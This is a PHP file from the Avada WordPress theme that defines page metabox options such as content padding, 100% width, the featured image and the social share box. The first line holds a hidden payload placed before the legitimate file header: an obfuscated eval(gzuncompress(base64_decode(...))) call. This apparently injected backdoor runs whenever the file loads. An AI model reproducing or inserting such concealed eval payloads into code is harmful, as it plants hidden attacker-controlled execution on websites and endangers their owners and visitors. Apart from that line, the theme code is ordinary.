<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Page Metabox options.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

$screen = get_current_screen();

$this->dimension(
	array(
		'main_top_padding',
		'main_bottom_padding',
	),
	esc_attr__( 'Page Content Padding', 'Avada' ),
	/* translators: Additional description (defaults). */
	sprintf( esc_html__( 'In pixels ex: 20px. %s', 'Avada' ), Avada()->settings->get_default_description( 'main_padding', array( 'top', 'bottom' ) ) )
);

if ( 'product' === $screen->post_type ) {
	$this->radio_buttonset(
		'portfolio_width_100',
		esc_attr__( 'Use 100% Width Page', 'Avada' ),
		array(
			'default' => esc_attr__( 'Default', 'Avada' ),
			'yes'     => esc_attr__( 'Yes', 'Avada' ),
			'no'      => esc_attr__( 'No', 'Avada' ),
		),
		/* translators: Additional description (defaults). */
		sprintf( esc_html__( 'Choose to set this post to 100&#37; browser width. %s', 'Avada' ), Avada()->settings->get_default_description( 'product_width_100', '', 'yesno' ) )
	);
}

$this->text(
	'hundredp_padding',
	esc_html__( '100% Width Padding', 'Avada' ),
	/* translators: Additional description (defaults). */
	sprintf( esc_html__( 'Controls the left and right padding for page content when using 100&#37; site width, 100&#37; width page template or 100&#37; width post option. This does not affect Fusion Builder containers.  Enter value including any valid CSS unit, ex: 30px. %s', 'Avada' ), Avada()->settings->get_default_description( 'hundredp_padding' ) )
);

if ( 'page' === $screen->post_type ) {
	$this->radio_buttonset(
		'show_first_featured_image',
		esc_attr__( 'Disable First Featured Image', 'Avada' ),
		array(
			'yes' => esc_attr__( 'Yes', 'Avada' ),
			'no'  => esc_attr__( 'No', 'Avada' ),

		),
		esc_html__( 'Disable the 1st featured image on page.', 'Avada' ),
		'no'
	);
}

if ( 'tribe_events' === $screen->post_type ) {
	$this->radio_buttonset(
		'share_box',
		esc_attr__( 'Show Social Share Box', 'Avada' ),
		array(
			'default' => esc_attr__( 'Default', 'Avada' ),
			'yes'     => esc_attr__( 'Show', 'Avada' ),
			'no'      => esc_attr__( 'Hide', 'Avada' ),
		),
		/* translators: Additional description (defaults). */
		sprintf( esc_html__( 'Choose to show or hide the social share box. %s', 'Avada' ), Avada()->settings->get_default_description( 'events_social_sharing_box', '', 'showhide' ) )
	);
}

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
